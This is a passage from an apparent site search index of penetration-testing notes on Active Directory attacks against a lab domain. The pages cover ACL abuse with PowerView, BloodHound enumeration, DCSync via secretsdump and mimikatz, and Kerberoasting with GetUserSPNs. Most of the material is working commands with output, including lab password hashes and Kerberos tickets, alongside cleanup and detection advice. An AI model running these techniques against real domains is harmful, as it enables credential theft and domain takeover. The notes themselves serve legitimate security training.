{"config":{"indexing":"full","jieba_dict":null,"jieba_dict_user":null,"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\u200b\\-,:!=\\[\\]()\"/]+|\\.(?!\\d)|&[lg]t;|(?!\\b)(?=[A-Z][a-z])"},"docs":[{"location":"about/","text":"<p>  </p> <p>   Hi! I'm Dennis, a security enthusiast from Germany. I'm incredibly passionate about cyber security.   I like to play around with various things related to hacking, security and tech in general.    I love to learn, but I love sharing the things I've learned even more - that's what this site is for.    Feel free to get in touch with me via Twitter or Email. I'm always up for a chat about anything related to security. </p> <p> LinkedIn  GitHub  Twitter  Email  </p>","title":"About Me"},{"location":"active_directory/acls/acl_abuse/","text":"<p>We are in control of the <code>wley</code> user whose NTLMv2 hash we retrieved by running Responder earlier in the assessment. Lucky for us, this user was using a weak password, and we were able to crack the hash offline using Hashcat and retrieve the cleartext value. We know that we can use this access to kick off an attack chain that will result in us taking control of the adunn user who can perform the DCSync attac.</p> <p>To perform the attack chain we have to:</p> <ol> <li>Use the <code>wley</code> user to change the password for the <code>damundsen</code> user</li> <li>Authenticate as the <code>damundsen</code> user and leverage <code>GenericAll</code> rights to add a user that we control to the <code>Help Desk Level 1</code> group</li> <li>Take advantage of nested group membership in the <code>Information Technology</code> group and leverage <code>GenericAll</code> rights to take control of the <code>adunn</code> user</li> </ol> <p>First, we must authenticate as <code>wley</code> and force change the password of the user <code>damundsen</code>.</p> <pre><code>PS C:\\xyz&gt; $SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force\nPS C:\\xyz&gt; $Cred = New-Object System.Management.Automation.PSCredential('LEGALCORP\\wley', $SecPassword) \n</code></pre> <p>Next, we must create a SecureString object which represents the password we want to set for the target user <code>damundsen</code>.</p> <pre><code>PS C:\\xyz&gt; $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n</code></pre> <p>Finally, we'll use the Set-DomainUserPassword PowerView function to change the user's password. We could do this from a Linux attack host using a tool such as <code>pth-net</code>, which is part of the pth-toolkit.</p> <pre><code>PS C:\\xyz&gt; cd C:\\Tools\\\nPS C:\\xyz&gt; Import-Module .\\PowerView.ps1\nPS C:\\xyz&gt; Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose\n\nVERBOSE: [Get-PrincipalContext] Using alternate credentials\nVERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'\nVERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset\n</code></pre> <p>Next, we need to perform a similar process to authenticate as the <code>damundsen</code> user and add ourselves to the <code>Help Desk Level 1</code> group.</p> <pre><code>PS C:\\xyz&gt; $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\nPS C:\\xyz&gt; $Cred2 = New-Object System.Management.Automation.PSCredential('LEGALCORP\\damundsen', $SecPassword) \n</code></pre> <p>We can use the Add-DomainGroupMember function to add ourselves to the target group. We can first confirm that our user is not a member of the target group. This could also be done from a Linux host using the <code>pth-toolkit</code>.</p> <pre><code>PS C:\\xyz&gt; Get-ADGroup -Identity \"Help Desk Level 1\" -Properties * | Select -ExpandProperty Members\n\nCN=Stella Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=LEGALCORP,DC=LOCAL\nCN=Marie Wright,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=LEGALCORP,DC=LOCAL\nCN=Jerrell Metzler,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=LEGALCORP,DC=LOCAL\nCN=Evelyn Mailloux,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=LEGALCORP,DC=LOCAL\nCN=Juanita Marrero,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=LEGALCORP,DC=LOCAL\nCN=Joseph Miller,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=LEGALCORP,DC=LOCAL\nCN=Wilma Funk,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=LEGALCORP,DC=LOCAL\n&lt;SNIP&gt;\n</code></pre> <pre><code>PS C:\\xyz&gt; Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose\n\nVERBOSE: [Get-PrincipalContext] Using alternate credentials\nVERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'\n</code></pre> <p>Confirming damundsen was Added to the Group <pre><code>PS C:\\xyz&gt; Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName\n\nMemberName\n----------\nbusucher\nspergazed\n\n&lt;SNIP&gt;\n\ndamundsen\ndpayne\n</code></pre></p> <p>At this point, we should be able to leverage our new group membership to take control over the <code>adunn</code> user. Now, let's say that our client permitted us to change the password of the <code>damundsen</code> user, but the <code>adunn</code> user is an admin account that cannot be interrupted. Since we have <code>GenericAll</code> rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.</p> <p>We must be authenticated as a member of the <code>Information Technology</code> group for this to be successful. Since we added <code>damundsen</code> to the <code>Help Desk Level 1</code> group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN. We could use the tool targetedKerberoast to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.</p> <p>Creating a Fake SPN <pre><code>PS C:\\xyz&gt; Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose\n\nVERBOSE: [Get-Domain] Using alternate credentials for Get-Domain\nVERBOSE: [Get-Domain] Extracted domain 'LEGALCORP' from -Credential\nVERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.legalcorp.local/DC=LEGALCORP,DC=LOCAL\nVERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection\nVERBOSE: [Get-DomainObject] Get-DomainObject filter string:\n(&amp;(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))\nVERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'\n</code></pre></p> <p>If this worked, we should be able to Kerberoast the user using any number of methods and obtain the hash for offline cracking.</p> <pre><code>PS C:\\xyz&gt; .\\Rubeus.exe kerberoast /user:adunn /nowrap\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.0.2\n\n\n[*] Action: Kerberoasting\n\n[*] NOTICE: AES hashes will be returned for AES-enabled accounts.\n[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\n\n[*] Target User            : adunn\n[*] Target Domain          : legalcorp.local\n[*] Searching path 'LDAP://ACADEMY-EA-DC01.legalcorp.local/DC=LEGALCORP,DC=LOCAL' for '(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'\n\n[*] Total kerberoastable users : 1\n\n\n[*] SamAccountName         : adunn\n[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=LEGALCORP,DC=LOCAL\n[*] ServicePrincipalName   : notahacker/LEGIT\n[*] PwdLastSet             : 3/1/2022 11:29:08 AM\n[*] Supported ETypes       : RC4_HMAC_DEFAULT\n[*] Hash                   : $krb5tgs$23$*adunn$legalcorp.local$notahacker/LEGIT@legalcorp.local*$ &lt;SNIP&gt;\n</code></pre> <p>We obtained the hash. Now, attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the adunn user and perform the DCSync attack.</p>  Cleanup <p>In terms of cleanup, there are a few things we need to do:</p> <ol> <li>Remove the fake SPN we created on the <code>adunn</code> user.</li> <li>Remove the <code>damundsen</code> user from the <code>Help Desk Level 1</code> group</li> <li>Set the password for the <code>damundsen</code> user back to its original value (if we know it) or have our client set it/alert the user</li> </ol> <p>Removing the Fake SPN from adunn's Account <pre><code>PS C:\\xyz&gt; Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose\n\nVERBOSE: [Get-Domain] Using alternate credentials for Get-Domain\nVERBOSE: [Get-Domain] Extracted domain 'LEGALCORP' from -Credential\nVERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.legalcorp.local/DC=LEGALCORP,DC=LOCAL\nVERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection\nVERBOSE: [Get-DomainObject] Get-DomainObject filter string:\n(&amp;(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))\nVERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'\n</code></pre></p> <p>Removing damundsen from the Help Desk Level 1 Group <pre><code>PS C:\\xyz&gt; Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose\n\nVERBOSE: [Get-PrincipalContext] Using alternate credentials\nVERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'\nTrue\n</code></pre></p> <pre><code>PS C:\\xyz&gt; Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose\n</code></pre> <p>Even though we performed as much cleanup as possible, we should still include every modification that we make in our final assessment report.</p> <p>This is just one example attack path. There could be many attack paths in a large domain, some shorter and some more complicated. Sometimes, an ACL attack chain may be too time-consuming or potentially destructive, so we may prefer to enumerate the path to present our client with enough evidence to understand the issue and perform remediation.</p>  Detection and Mitigation <p>Detection and Remediation</p> <ol> <li> <code>Auditing for and removing dangerous ACLs</code> </li> </ol> <p>Organizations should have regular AD audits performed but also train internal staff to run tools such as BloodHound and identify potentially dangerous ACLs that can be removed.</p> <ol> <li> <code>Monitor group membership</code> </li> </ol> <p>Visibility into important groups is paramount. All high-impact groups in the domain should be monitored to alert IT staff of changes that could be indicative of an ACL attack chain.</p> <ol> <li> <code>Audit and monitor for ACL changes</code> </li> </ol> <p>Enabling the Advanced Security Audit Policy can help in detecting unwanted changes, especially Event ID 5136: A directory service object was modified which would indicate that the domain object was modified, which could be indicative of an ACL attack.</p>","title":"ACL Abuse Tactics"},{"location":"active_directory/acls/acl_enumeration/","text":"Enumerating ACLs with PowerView <p>We can use PowerView to enumerate ACLs, but the task of digging through all of the results will be extremely time-consuming and likely inaccurate.</p>  Enumerating ACLs with BloodHound <p>Upload gathered Data to BloodHound. Set the <code>wley</code> user as our starting node, select the <code>Node Info</code> tab and scroll down to <code>Outbound Control Rights</code>. This option will show us objects we have control over directly, via group membership, and the number of objects that our user could lead to us controlling via ACL attack paths under <code>Transitive Object Control</code>. If we click on the <code>1</code> next to <code>First Degree Object Control</code>, we see the first set of rights that we enumerated, <code>ForceChangePassword</code> over the <code>damundsen</code> user.</p> <p></p> <p>If we right-click on the line between the two objects, a menu will pop up. If we select <code>Help</code>, we will be presented with help around abusing this ACE, including:</p> <ul> <li>More info on the specific right, tools, and commands that can be used to pull off this attack</li> <li>Operational Security (Opsec) considerations</li> <li>External references.</li> </ul> <p></p> <p>If we click on the <code>16</code> next to <code>Transitive Object Control</code>, we will see the entire path that we painstakingly enumerated above. From here, we could leverage the help menus for each edge to find ways to best pull off each attack.</p> <p>Viewing Potential Attack Paths through BloodHound </p> <p>Finally, we can use the pre-built queries in BloodHound to confirm that the <code>adunn</code> user has DCSync rights.</p> <p></p>","title":"ACL Enumeration"},{"location":"active_directory/acls/dcsync/","text":"What is DCSync and How Does it Work? <p>DCSync is a technique for stealing the Active Directory password database by using the built-in <code>Directory Replication Service Remote Protocol</code>, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.</p> <p>The crux of the attack is requesting a Domain Controller to replicate passwords via the <code>DS-Replication-Get-Changes-All</code> extended right. This is an extended access control right within AD, which allows for the replication of secret data.</p> <p>To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.</p>  <pre><code>PS C:\\xyz&gt; Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl\n\n\nsamaccountname     : adunn\nobjectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164\n&lt;SNIP&gt;\n</code></pre> <p>PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account. We first get the user's SID in the above command and then check all ACLs set on the domain object (<code>\"DC=LEGALCORP,DC=local\"</code>) using Get-ObjectAcl to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user <code>adunn</code> (denoted in the below command as <code>$sid</code>) possesses these rights. The command confirms that the user does indeed have the rights.</p> <pre><code>PS C:\\xyz&gt; $sid= \"S-1-5-21-3842939050-3880317879-2865463114-1164\"\nPS C:\\xyz&gt; Get-ObjectAcl \"DC=LEGALCORP,DC=local\" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl\n\nAceQualifier          : AccessAllowed\nObjectDN              : DC=LEGALCORP,DC=LOCAL\nActiveDirectoryRights : ExtendedRight\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498\nObjectAceType         : DS-Replication-Get-Changes\n\nAceQualifier          : AccessAllowed\nObjectDN              : DC=LEGALCORP,DC=LOCAL\nActiveDirectoryRights : ExtendedRight\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516\nObjectAceType         : DS-Replication-Get-Changes-All\n\nAceQualifier          : AccessAllowed\nObjectDN              : DC=LEGALCORP,DC=LOCAL\nActiveDirectoryRights : ExtendedRight\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164\nObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set\n\nAceQualifier          : AccessAllowed\nObjectDN              : DC=LEGALCORP,DC=LOCAL\nActiveDirectoryRights : ExtendedRight\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164\nObjectAceType         : DS-Replication-Get-Changes\n\nAceQualifier          : AccessAllowed\nObjectDN              : DC=LEGALCORP,DC=LOCAL\nActiveDirectoryRights : ExtendedRight\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164\nObjectAceType         : DS-Replication-Get-Changes-All\n</code></pre> <p>The <code>-just-dc</code> flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.</p> <pre><code>secops@kali[/kali]$ secretsdump.py -outputfile LEGALCORP_hashes -just-dc LEGALCORP/adunn@172.16.5.5 \n\nImpacket v0.9.23 - Copyright 2021 SecureAuth Corporation\n\nPassword:\n[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5\n[*] Searching for NTDS.dit\n[*] Registry says NTDS.dit is at C:\\Windows\\NTDS\\ntds.dit. Calling vssadmin to get a copy. This might take some time\n[*] Using smbexec method for remote execution\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Searching for pekList, be patient\n[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6\n[*] Reading and decrypting hashes from \\\\172.16.5.5\\ADMIN$\\Temp\\HOLJALFD.tmp \nlegalcorp.local\\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::\nguest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nlab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::\nACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::\n\n&lt;SNIP&gt;\n</code></pre> <p>If we check the files created using the <code>-just-dc</code> flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with reversible encryption enabled.</p> <pre><code>secops@kali[/kali]$ ls LEGALCORP_hashes*\n\nLEGALCORP_hashes.ntds  LEGALCORP_hashes.ntds.cleartext  LEGALCORP_hashes.ntds.kerberos\n</code></pre> Performing the Attack with Mimikatz <pre><code>PS C:\\xyz&gt; .\\mimikatz.exe\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # lsadump::dcsync /domain:legalcorp.local /user:LEGALCORP\\administrator\n[DC] 'legalcorp.local' will be the domain\n[DC] 'ACADEMY-EA-DC01.legalcorp.local' will be the DC server\n[DC] 'LEGALCORP\\administrator' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : Administrator\n\n** SAM ACCOUNT **\n\nSAM Username         : administrator\nUser Principal Name  : administrator@legalcorp.local\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )\nAccount expiration   :\nPassword last change : 10/27/2021 6:49:32 AM\nObject Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500\nObject Relative ID   : 500\n\nCredentials:\n  Hash NTLM: 88ad09182de639ccc6579eb0849751cf\n\nSupplemental Credentials:\n* Primary:NTLM-Strong-NTOWF *\n    Random Value : 4625fd0c31368ff4c255a3b876eaac3d\n\n&lt;SNIP&gt;\n</code></pre>","title":"DCSync"},{"location":"active_directory/cooking_with_fire/kerberoasting_from_linux/","text":"Kerberoasting Overview <p>Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as <code>NT AUTHORITY\\LOCAL SERVICE</code>. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary.</p> <p>For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.</p>  Performing the Attack <p>Depending on your position in a network, this attack can be performed in multiple ways:</p> <ul> <li>From a non-domain joined Linux host using valid domain user credentials.</li> <li>From a domain-joined Linux host as root after retrieving the keytab file.</li> <li>From a domain-joined Windows host authenticated as a domain user.</li> <li>From a domain-joined Windows host with a shell in the context of a domain account.</li> <li>As SYSTEM on a domain-joined Windows host.</li> <li>From a non-domain joined Windows host using runas /netonly.</li> </ul> <p>Several tools can be utilized to perform the attack:</p> <ul> <li>Impacket\u2019s GetUserSPNs.py from a non-domain joined Linux host.</li> <li>A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.</li> <li>From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts.</li> </ul> <p>Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be <code>cracked</code> offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.</p>  Efficacy of the Attack <p>While it can be a great way to move laterally or escalate privileges in a domain, Kerberoasting and the presence of SPNs do not guarantee us any level of access. We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.</p>  Kerberoasting with GetUserSPNs.py  <p>A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it. </p>  <p>It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.</p> <pre><code>secops@kali[/kali]$ GetUserSPNs.py -dc-ip 172.16.5.5 legalcorp.local/forend\n\nImpacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation\n\nPassword:\nServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation \n---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------\nbackupjob/veam001.legalcorp.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=LEGALCORP,DC=LOCAL                                       2022-02-15 17:15:40.842452  &lt;never&gt;               \nsts/legalcorp.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=LEGALCORP,DC=LOCAL                                       2022-02-15 17:14:48.701834  &lt;never&gt;               \n</code></pre> <p>We can now pull all TGS tickets for offline processing using the <code>-request</code> flag.</p> <pre><code>secops@kali[/kali]$ GetUserSPNs.py -dc-ip 172.16.5.5 legalcorp.local/forend -request \n\nImpacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation\n\nPassword:\nServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation \n---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------\nbackupjob/veam001.legalcorp.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=LEGALCORP,DC=LOCAL                                       2022-02-15 17:15:40.842452  &lt;never&gt;               \nsts/legalcorp.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=LEGALCORP,DC=LOCAL                                       2022-02-15 17:14:48.701834  &lt;never&gt;               \n\n$krb5tgs$23$*BACKUPAGENT$legalcorp.local$legalcorp.local/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$b6be1ba275e23edd3b7dd3ad4d711c68f9170bac85e722cc3d94c80c5dca6bf2f07ed3d3bc209e9a6ff0445cab89923b26a01879a53249c5f0a8c4bb41f0ea1b1196c322640d37ac064ebe3755ce888947da98b5707e6b06cbf679db1e7bbbea7d10c36d27f976d3f9793895fde20d3199411a90c528a51c91d6119cb5835bd29457887dd917b6c621b91c2627b8dee8c2c16619dc2a7f6113d2e215aef48e9e4bba8deff329a68666976e55e6b3af0cb8184e5ea6c8c2060f8304bb9e5f5d930190e08d03255954901dc9bb12e53ef87ed603eb2247d907c3304345b5b481f107cefdb4b01be9f4937116016ef4bbefc8af2070d039136b79484d9d6c7706837cd9ed4797ad66321f2af200bba66f65cac0584c42d900228a63af39964f02b016a68a843a81f562b493b29a4fc1ce3ab47b934cbc1e29545a1f0c0a6b338e5ac821fec2bee503bc56f6821945a4cdd24bf355c83f5f91a671bdc032245d534255aac81d1ef318d83e3c52664cfd555d24a632ee94f4adeb258b91eda3e57381dba699f5d6ec7b9a8132388f2346d33b670f1874dfa1e8ee13f6b3421174a61029962628f0bc84fa0c3c6d7bbfba8f2d1900ef9f7ed5595d80edc7fc6300385f9aa6ce1be4c5b8a764c5b60a52c7d5bbdc4793879bfcd7d1002acbe83583b5a995cf1a4bbf937904ee6bb537ee00d99205ebf5f39c722d24a910ae0027c7015e6daf73da77af1306a070fdd50aed472c444f5496ebbc8fe961fee9997651daabc0ef0f64d47d8342a499fa9fb8772383a0370444486d4142a33bc45a54c6b38bf55ed613abbd0036981dabc88cc88a5833348f293a88e4151fbda45a28ccb631c847da99dd20c6ea4592432e0006ae559094a4c546a8e0472730f0287a39a0c6b15ef52db6576a822d6c9ff06b57cfb5a2abab77fd3f119caaf74ed18a7d65a47831d0657f6a3cc476760e7f71d6b7cf109c5fe29d4c0b0bb88ba963710bd076267b889826cc1316ac7e6f541cecba71cb819eace1e2e2243685d6179f6fb6ec7cfcac837f01989e7547f1d6bd6dc772aed0d99b615ca7e44676b38a02f4cb5ba8194b347d7f21959e3c41e29a0ad422df2a0cf073fcfd37491ac062df903b77a32101d1cb060efda284cae727a2e6cb890f4243a322794a97fc285f04ac6952aa57032a0137ad424d231e15b051947b3ec0d7d654353c41d6ad30c6874e5293f6e25a95325a3e164abd6bc205e5d7af0b642837f5af9eb4c5bca9040ab4b999b819ed6c1c4645f77ae45c0a5ae5fe612901c9d639392eaac830106aa249faa5a895633b20f553593e3ff01a9bb529ff036005ec453eaec481b7d1d65247abf62956366c0874493cf16da6ffb9066faa5f5bc1db5bbb51d9ccadc6c97964c7fe1be2fb4868f40b3b59fa6697443442fa5cebaaed9db0f1cb8476ec96bc83e74ebe51c025e14456277d0a7ce31e8848d88cbac9b57ac740f4678f71a300b5f50baa6e6b85a3b10a10f44ec7f708624212aeb4c60877322268acd941d590f81ffc7036e2e455e941e2cfb97e33fec5055284ae48204d\n$krb5tgs$23$*SOLARWINDSMONITOR$legalcorp.local$legalcorp.local/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec4215e1$d0fb2166453e4f2483735b9005e15667dbfd40fc9f8b5028e4b510fc570f5086978371ecd81ba6790b3fa7ff9a007ee9040f0566f4aed3af45ac94bd884d7b20f87d45b51af83665da67fb394a7c2b345bff2dfe7fb72836bb1a43f12611213b19fdae584c0b8114fb43e2d81eeee2e2b008e993c70a83b79340e7f0a6b6a1dba9fa3c9b6b02adde8778af9ed91b2f7fa85dcc5d858307f1fa44b75f0c0c80331146dfd5b9c5a226a68d9bb0a07832cc04474b9f4b4340879b69e0c4e3b6c0987720882c6bb6a52c885d1b79e301690703311ec846694cdc14d8a197d8b20e42c64cc673877c0b70d7e1db166d575a5eb883f49dfbd2b9983dd7aab1cff6a8c5c32c4528e798237e837ffa1788dca73407aac79f9d6f74c6626337928457e0b6bbf666a0778c36cba5e7e026a177b82ed2a7e119663d6fe9a7a84858962233f843d784121147ef4e63270410640903ea261b04f89995a12b42a223ed686a4c3dcb95ec9b69d12b343231cccfd29604d6d777939206df4832320bdd478bda0f1d262be897e2dcf51be0a751490350683775dd0b8a175de4feb6cb723935f5d23f7839c08351b3298a6d4d8530853d9d4d1e57c9b220477422488c88c0517fb210856fb603a9b53e734910e88352929acc00f82c4d8f1dd783263c04aff6061fb26f3b7a475536f8c0051bd3993ed24ff22f58f7ad5e0e1856a74967e70c0dd511cc52e1d8c2364302f4ca78d6750aec81dfdea30c298126987b9ac867d6269351c41761134bc4be67a8b7646935eb94935d4121161de68aac38a740f09754293eacdba7dfe26ace6a4ea84a5b90d48eb9bb3d5766827d89b4650353e87d2699da312c6d0e1e26ec2f46f3077f13825764164368e26d58fc55a358ce979865cc57d4f34691b582a3afc18fe718f8b97c44d0b812e5deeed444d665e847c5186ad79ae77a5ed6efab1ed9d863edb36df1a5cd4abdbf7f7e872e3d5fa0bf7735348744d4fc048211c2e7973839962e91db362e5338da59bc0078515a513123d6c5537974707bdc303526437b4a4d3095d1b5e0f2d9db1658ac2444a11b59ddf2761ce4c1e5edd92bcf5cbd8c230cb4328ff2d0e2813b4654116b4fda929a38b69e3f9283e4de7039216f18e85b9ef1a59087581c758efec16d948accc909324e94cad923f2487fb2ed27294329ed314538d0e0e75019d50bcf410c7edab6ce11401adbaf5a3a009ab304d9bdcb0937b4dcab89e90242b7536644677c62fd03741c0b9d090d8fdf0c856c36103aedfd6c58e7064b07628b58c3e086a685f70a1377f53c42ada3cb7bb4ba0a69085dec77f4b7287ca2fb2da9bcbedc39f50586bfc9ec0ac61b687043afa239a46e6b20aacb7d5d8422d5cacc02df18fea3be0c0aa0d83e7982fc225d9e6a2886dc223f6a6830f71dabae21ff38e1722048b5788cd23ee2d6480206df572b6ba2acfe1a5ff6bee8812d585eeb4bc8efce92fd81aa0a9b57f37bf3954c26afc98e15c5c90747948d6008c80b620a1ec54ded2f3073b4b09ee5cc233bf7368427a6af0b1cb1276ebd85b45a30\n\n&lt;SNIP&gt;\n</code></pre> <p>We can also request just the TGS ticket for a specific account.  <pre><code>secops@kali[/kali]$ GetUserSPNs.py -dc-ip 172.16.5.5 legalcorp.local/forend -request-user sqldev\n\nImpacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation\n\nPassword:\nServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation \n---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------\nMSSQLSvc/DEV-PRE-SQL.legalcorp.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=LEGALCORP,DC=LOCAL  2022-02-15 17:13:31.639334  &lt;never&gt;               